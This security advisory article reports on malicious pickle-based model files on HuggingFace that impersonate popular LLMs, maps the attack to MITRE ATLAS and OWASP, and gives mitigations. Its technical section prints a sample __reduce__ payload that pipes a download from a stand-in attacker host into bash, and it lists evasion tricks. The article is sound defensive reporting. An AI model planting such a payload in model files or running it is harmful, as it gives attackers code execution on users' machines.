---
title: "Malicious Model Weights Discovered on HuggingFace Hub — Supply Chain Attack Targets ML Engineers"
date: 2024-01-12T11:00:00+05:30
draft: false

summary: "JFrog Security researchers uncovered over 100 malicious model repositories on HuggingFace that execute arbitrary code during model loading via pickle deserialization exploits. The models impersonate popular open-source LLMs to maximize reach."

source: "JFrog Security"
source_url: "https://jfrog.com/blog/data-scientists-targeted/"
author: "SENTINEL AI Editorial"
thumbnail: ""

relevance_score: 8.7
threat_level: "HIGH"

mitre_techniques:
  - "AML.T0019 - Publish Poisoned Datasets"
  - "AML.T0018 - Backdoor ML Model"
  - "AML.T0010 - ML Supply Chain Compromise"

owasp_categories:
  - "LLM05 - Supply Chain Vulnerabilities"
  - "LLM03 - Training Data Poisoning"

categories:
  - "Supply Chain"
  - "Model Poisoning"
  - "LLM Security"

tags:
  - "huggingface"
  - "supply-chain"
  - "pickle"
  - "malware"
  - "model-weights"
  - "rce"

frameworks:
  - "mitre-atlas"
  - "owasp-llm"

threat_actors:
  - "cybercriminal"

fetched_at: "2024-01-12T08:00:00Z"
feed_source: "SecurityWeek"
---

## Overview

JFrog Security's research team has identified 100+ malicious model repositories on the HuggingFace Hub that achieve remote code execution on any machine that loads them. The attack exploits Python's `pickle` serialization format — the default format for PyTorch model weights — to embed arbitrary executable code within `.pt` and `.bin` files.

The malicious repositories were discovered mimicking legitimate models including Llama 2, Mistral, and CodeLlama variants, with names carefully chosen to appear in search results alongside official releases.

## Technical Analysis

**The Pickle Vector**

PyTorch's default serialization format uses Python's `pickle` module, which executes arbitrary Python code during deserialization. A malicious model file can embed a `__reduce__` method that runs OS commands when `torch.load()` is called:

```python
# Malicious payload embedded in model weights
import os
class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ('curl -s http://attacker.com/beacon | bash',))
```

**Evasion Techniques Observed**

- Split payloads across multiple shards to evade single-file scanners
- Legitimate model architecture metadata to pass superficial validation
- Delayed execution triggers (payload activates after N model calls)
- Multiple persistence mechanisms targeting both Linux and Windows

**Typosquatting Pattern**

The attacker registered repository names such as:
- `meta-llama/Llama-2-7b-chat-hf-fast` (authentic: `meta-llama/Llama-2-7b-chat-hf`)
- `mistralai/Mistral-7B-v0.1-gguf` (authentic: `mistralai/Mistral-7B-v0.1`)

## Framework Mapping

### MITRE ATLAS

- **AML.T0019 — Publish Poisoned Datasets**: Publishing malicious artifacts to public ML repositories
- **AML.T0018 — Backdoor ML Model**: Embedding malicious code within what appears to be a legitimate model
- **AML.T0010 — ML Supply Chain Compromise**: Targeting the model distribution pipeline

### OWASP LLM Top 10

- **LLM05 — Supply Chain Vulnerabilities**: The attack targets the model download and loading pipeline
- **LLM03 — Training Data Poisoning**: Extends to scenarios where victim re-uses weights for fine-tuning

## Impact Assessment

Any data scientist, ML engineer, or automated pipeline that calls `torch.load()` on untrusted model files without sandboxing is vulnerable. Given that HuggingFace Hub has over 500,000 models and is the de facto standard for model distribution, the blast radius is significant. Automated ML pipelines (CI/CD, training clusters) are particularly at risk as they often load models without human review.

## Mitigation & Recommendations

1. **Use `torch.load(..., weights_only=True)`** — available in PyTorch ≥ 2.0, prevents code execution during load
2. **Prefer safetensors format** over pickle-based `.pt`/`.bin` files; it cannot execute code by design
3. **Verify model provenance** — only download from verified organization accounts with the HuggingFace "Verified" badge
4. **Scan with Protect AI's ModelScan** or similar tools before loading any third-party model
5. **Sandbox model loading** in isolated environments (containers, VMs) with no network access

## References

- [JFrog Research: Data Scientists Targeted](https://jfrog.com/blog/data-scientists-targeted/)
- [safetensors format](https://huggingface.co/docs/safetensors)
- [MITRE ATLAS — AML.T0010](https://atlas.mitre.org/techniques/AML.T0010)
